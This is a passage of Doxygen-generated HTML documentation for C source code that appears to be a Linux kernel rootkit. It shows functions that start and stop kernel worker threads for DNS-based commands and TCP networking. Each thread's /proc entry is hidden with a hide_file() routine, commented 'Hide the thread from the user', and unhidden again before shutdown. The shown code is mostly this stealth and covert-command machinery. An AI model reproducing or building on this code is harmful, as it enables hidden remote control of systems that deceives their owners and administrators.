<div class="line"><span class="lineno">   50</span>    <a class="code hl_variable" href="../../d2/d22/dns_2worker_8c.html#a37b7a94812309f44c018a602be83b9ad">dns_worker_thread</a> = kthread_run(<a class="code hl_function" href="../../d2/d22/dns_2worker_8c.html#af15c7f87e4d52b4b1732abca083eb7e5">dns_worker</a>, NULL, <a class="code hl_define" href="../../db/d16/config_8h.html#a274af98996e59adbb54c03301b7c8f79">DNS_WORKER_THREAD_NAME</a>);</div>
<div class="line"><span class="lineno">   51</span>    <span class="keywordflow">if</span> (IS_ERR(<a class="code hl_variable" href="../../d2/d22/dns_2worker_8c.html#a37b7a94812309f44c018a602be83b9ad">dns_worker_thread</a>))</div>
<div class="line"><span class="lineno">   52</span>        <span class="keywordflow">return</span> PTR_ERR(<a class="code hl_variable" href="../../d2/d22/dns_2worker_8c.html#a37b7a94812309f44c018a602be83b9ad">dns_worker_thread</a>);</div>
<div class="line"><span class="lineno">   53</span> </div>
<div class="line"><span class="lineno">   54</span>    <span class="comment">// Hide the thread from the user</span></div>
<div class="line"><span class="lineno">   55</span>    <span class="keywordtype">char</span> path[32] = { 0 };</div>
<div class="line"><span class="lineno">   56</span>    snprintf(path, <span class="keyword">sizeof</span>(path), <span class="stringliteral">&quot;/proc/%d&quot;</span>, <a class="code hl_variable" href="../../d2/d22/dns_2worker_8c.html#a37b7a94812309f44c018a602be83b9ad">dns_worker_thread</a>-&gt;pid);</div>
<div class="line"><span class="lineno">   57</span>    <a class="code hl_function" href="../../d6/dee/hide__api_8c.html#a187cbdb4b2755a9436a0661bc40108fb">hide_file</a>(path);</div>
<div class="line"><span class="lineno">   58</span> </div>
<div class="line"><span class="lineno">   59</span>    <span class="keywordflow">return</span> <a class="code hl_define" href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a>;</div>
<div class="line"><span class="lineno">   60</span>}</div>
<div class="ttc" id="aconfig_8h_html_a274af98996e59adbb54c03301b7c8f79"><div class="ttname"><a href="../../db/d16/config_8h.html#a274af98996e59adbb54c03301b7c8f79">DNS_WORKER_THREAD_NAME</a></div><div class="ttdeci">#define DNS_WORKER_THREAD_NAME</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00040">config.h:40</a></div></div>
<div class="ttc" id="adns_2worker_8c_html_a37b7a94812309f44c018a602be83b9ad"><div class="ttname"><a href="../../d2/d22/dns_2worker_8c.html#a37b7a94812309f44c018a602be83b9ad">dns_worker_thread</a></div><div class="ttdeci">static struct task_struct * dns_worker_thread</div><div class="ttdef"><b>Definition</b> <a href="../../d2/d22/dns_2worker_8c_source.html#l00004">dns/worker.c:4</a></div></div>
<div class="ttc" id="adns_2worker_8c_html_af15c7f87e4d52b4b1732abca083eb7e5"><div class="ttname"><a href="../../d2/d22/dns_2worker_8c.html#af15c7f87e4d52b4b1732abca083eb7e5">dns_worker</a></div><div class="ttdeci">static int dns_worker(void *data)</div><div class="ttdoc">Kernel thread function to process DNS-based commands.</div><div class="ttdef"><b>Definition</b> <a href="../../d2/d22/dns_2worker_8c_source.html#l00017">dns/worker.c:17</a></div></div>
<div class="ttc" id="ahide__api_8c_html_a187cbdb4b2755a9436a0661bc40108fb"><div class="ttname"><a href="../../d6/dee/hide__api_8c.html#a187cbdb4b2755a9436a0661bc40108fb">hide_file</a></div><div class="ttdeci">int hide_file(const char *path)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/dee/hide__api_8c_source.html#l00025">hide_api.c:25</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a id="a2854e06612012f03c99698168e68c14f" name="a2854e06612012f03c99698168e68c14f"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a2854e06612012f03c99698168e68c14f">&#9670;&#160;</a></span>start_network_worker()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int start_network_worker </td>
          <td>(</td>
          <td class="paramtype">void&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">
<p>start_network_worker - Start the network worker thread. </p>

<p class="definition">Definition at line <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html#l00161">161</a> of file <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html">tcp/worker.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">  161</span>                               {</div>
<div class="line"><span class="lineno">  162</span>    <span class="keywordflow">if</span> (<a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a> &amp;&amp; !IS_ERR(<a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a>)) {</div>
<div class="line"><span class="lineno">  163</span>        <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;start_network_worker: thread already running\n&quot;</span>);</div>
<div class="line"><span class="lineno">  164</span>        <span class="keywordflow">return</span> -EBUSY;</div>
<div class="line"><span class="lineno">  165</span>    }</div>
<div class="line"><span class="lineno">  166</span> </div>
<div class="line"><span class="lineno">  167</span>    <a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a> =</div>
<div class="line"><span class="lineno">  168</span>        kthread_run(<a class="code hl_function" href="../../d4/d33/tcp_2worker_8c.html#a27e432a80775b74a89869a945fdd82eb">network_worker</a>, NULL, <a class="code hl_define" href="../../db/d16/config_8h.html#aa04c770744d5ff8ee6f11c8f2e34e849">NETWORK_WORKER_THREAD_NAME</a>);</div>
<div class="line"><span class="lineno">  169</span>    <span class="keywordflow">if</span> (IS_ERR(<a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a>)) {</div>
<div class="line"><span class="lineno">  170</span>        <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;start_network_worker: failed to start thread\n&quot;</span>);</div>
<div class="line"><span class="lineno">  171</span>        <span class="keywordflow">return</span> PTR_ERR(<a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a>);</div>
<div class="line"><span class="lineno">  172</span>    }</div>
<div class="line"><span class="lineno">  173</span> </div>
<div class="line"><span class="lineno">  174</span>    <span class="comment">// Hide the thread from the user</span></div>
<div class="line"><span class="lineno">  175</span>    <span class="keywordtype">char</span> path[32] = { 0 };</div>
<div class="line"><span class="lineno">  176</span>    snprintf(path, <span class="keyword">sizeof</span>(path), <span class="stringliteral">&quot;/proc/%d&quot;</span>, <a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a>-&gt;pid);</div>
<div class="line"><span class="lineno">  177</span>    <a class="code hl_function" href="../../d6/dee/hide__api_8c.html#a187cbdb4b2755a9436a0661bc40108fb">hide_file</a>(path);</div>
<div class="line"><span class="lineno">  178</span> </div>
<div class="line"><span class="lineno">  179</span>    <span class="keywordflow">return</span> <a class="code hl_define" href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a>;</div>
<div class="line"><span class="lineno">  180</span>}</div>
<div class="ttc" id="aconfig_8h_html_aa04c770744d5ff8ee6f11c8f2e34e849"><div class="ttname"><a href="../../db/d16/config_8h.html#aa04c770744d5ff8ee6f11c8f2e34e849">NETWORK_WORKER_THREAD_NAME</a></div><div class="ttdeci">#define NETWORK_WORKER_THREAD_NAME</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00034">config.h:34</a></div></div>
<div class="ttc" id="atcp_2worker_8c_html_a27e432a80775b74a89869a945fdd82eb"><div class="ttname"><a href="../../d4/d33/tcp_2worker_8c.html#a27e432a80775b74a89869a945fdd82eb">network_worker</a></div><div class="ttdeci">static int network_worker(void *data)</div><div class="ttdef"><b>Definition</b> <a href="../../d4/d33/tcp_2worker_8c_source.html#l00106">tcp/worker.c:106</a></div></div>
<div class="ttc" id="atcp_2worker_8c_html_a65d672686f8fc161c844c4c6b593f1f7"><div class="ttname"><a href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a></div><div class="ttdeci">static struct task_struct * network_worker_thread</div><div class="ttdef"><b>Definition</b> <a href="../../d4/d33/tcp_2worker_8c_source.html#l00007">tcp/worker.c:7</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a id="a64dda46c83f292c9877938a32e7576b7" name="a64dda46c83f292c9877938a32e7576b7"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a64dda46c83f292c9877938a32e7576b7">&#9670;&#160;</a></span>stop_dns_worker()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int stop_dns_worker </td>
          <td>(</td>
          <td class="paramtype">void&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Stops the DNS worker kernel thread. </p>
<p>This function stops the running DNS worker thread and cleans up its resources. If the thread is not running, it returns an error code indicating invalid operation.</p>
<dl class="section return"><dt>Returns</dt><dd>SUCCESS (0) on successful thread termination. </dd>
<dd>
-EINVAL if the thread is not running or is invalid. </dd></dl>

<p class="definition">Definition at line <a class="el" href="../../d2/d22/dns_2worker_8c_source.html#l00072">72</a> of file <a class="el" href="../../d2/d22/dns_2worker_8c_source.html">dns/worker.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">   72</span>                          {</div>
<div class="line"><span class="lineno">   73</span>    <span class="keywordflow">if</span> (!<a class="code hl_variable" href="../../d2/d22/dns_2worker_8c.html#a37b7a94812309f44c018a602be83b9ad">dns_worker_thread</a> || IS_ERR(<a class="code hl_variable" href="../../d2/d22/dns_2worker_8c.html#a37b7a94812309f44c018a602be83b9ad">dns_worker_thread</a>))</div>
<div class="line"><span class="lineno">   74</span>        <span class="keywordflow">return</span> -EINVAL;</div>
<div class="line"><span class="lineno">   75</span> </div>
<div class="line"><span class="lineno">   76</span>    <span class="comment">// Remove the hidden directory associated with the thread</span></div>
<div class="line"><span class="lineno">   77</span>    <span class="keywordtype">char</span> path[32] = { 0 };</div>
<div class="line"><span class="lineno">   78</span>    snprintf(path, <span class="keyword">sizeof</span>(path), <span class="stringliteral">&quot;/proc/%d&quot;</span>, <a class="code hl_variable" href="../../d2/d22/dns_2worker_8c.html#a37b7a94812309f44c018a602be83b9ad">dns_worker_thread</a>-&gt;pid);</div>
<div class="line"><span class="lineno">   79</span>    <a class="code hl_function" href="../../d6/dee/hide__api_8c.html#ac147abbca2116c29d3679c207b981a98">unhide_file</a>(path);</div>
<div class="line"><span class="lineno">   80</span> </div>
<div class="line"><span class="lineno">   81</span>    <span class="comment">// Stop the DNS worker thread</span></div>
<div class="line"><span class="lineno">   82</span>    kthread_stop(<a class="code hl_variable" href="../../d2/d22/dns_2worker_8c.html#a37b7a94812309f44c018a602be83b9ad">dns_worker_thread</a>);</div>
<div class="line"><span class="lineno">   83</span>    <a class="code hl_variable" href="../../d2/d22/dns_2worker_8c.html#a37b7a94812309f44c018a602be83b9ad">dns_worker_thread</a> = NULL;</div>
<div class="line"><span class="lineno">   84</span> </div>
<div class="line"><span class="lineno">   85</span>    <span class="keywordflow">return</span> <a class="code hl_define" href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a>;</div>
<div class="line"><span class="lineno">   86</span>}</div>
<div class="ttc" id="ahide__api_8c_html_ac147abbca2116c29d3679c207b981a98"><div class="ttname"><a href="../../d6/dee/hide__api_8c.html#ac147abbca2116c29d3679c207b981a98">unhide_file</a></div><div class="ttdeci">int unhide_file(const char *path)</div><div class="ttdef"><b>Definition</b> <a href="../../d6/dee/hide__api_8c_source.html#l00052">hide_api.c:52</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a id="af4b33ff003ec81aed0790bfcf426a025" name="af4b33ff003ec81aed0790bfcf426a025"></a>
<h2 class="memtitle"><span class="permalink"><a href="#af4b33ff003ec81aed0790bfcf426a025">&#9670;&#160;</a></span>stop_network_worker()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int stop_network_worker </td>
          <td>(</td>
          <td class="paramtype">void&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">
<p>stop_network_worker - Stop the network worker thread. </p>

<p class="definition">Definition at line <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html#l00185">185</a> of file <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html">tcp/worker.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">  185</span>                              {</div>
<div class="line"><span class="lineno">  186</span>    <span class="keywordflow">if</span> (!<a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a> || IS_ERR(<a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a>)) {</div>
<div class="line"><span class="lineno">  187</span>        <span class="keywordflow">return</span> -EINVAL;</div>
<div class="line"><span class="lineno">  188</span>    }</div>
<div class="line"><span class="lineno">  189</span> </div>
<div class="line"><span class="lineno">  190</span>    <span class="comment">// Remove the hidden directory associated with the thread</span></div>
<div class="line"><span class="lineno">  191</span>    <span class="keywordtype">char</span> path[32] = { 0 };</div>
<div class="line"><span class="lineno">  192</span>    snprintf(path, <span class="keyword">sizeof</span>(path), <span class="stringliteral">&quot;/proc/%d&quot;</span>, <a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a>-&gt;pid);</div>
<div class="line"><span class="lineno">  193</span>    <a class="code hl_function" href="../../d6/dee/hide__api_8c.html#ac147abbca2116c29d3679c207b981a98">unhide_file</a>(path);</div>
<div class="line"><span class="lineno">  194</span> </div>
<div class="line"><span class="lineno">  195</span>    <span class="comment">// Stop the network worker thread</span></div>
<div class="line"><span class="lineno">  196</span>    kthread_stop(<a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a>);</div>
<div class="line"><span class="lineno">  197</span>    <a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a65d672686f8fc161c844c4c6b593f1f7">network_worker_thread</a> = NULL;</div>
<div class="line"><span class="lineno">  198</span> </div>
<div class="line"><span class="lineno">  199</span>    <span class="keywordflow">return</span> <a class="code hl_define" href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a>;</div>
<div class="line"><span class="lineno">  200</span>}</div>
</div><!-- fragment -->
</div>
</div>
</div><!-- contents -->
</div><!-- doc-content -->

<div id="nav-path" class="navpath"><!-- id is needed for treeview function! --></div>
</body>
</html>
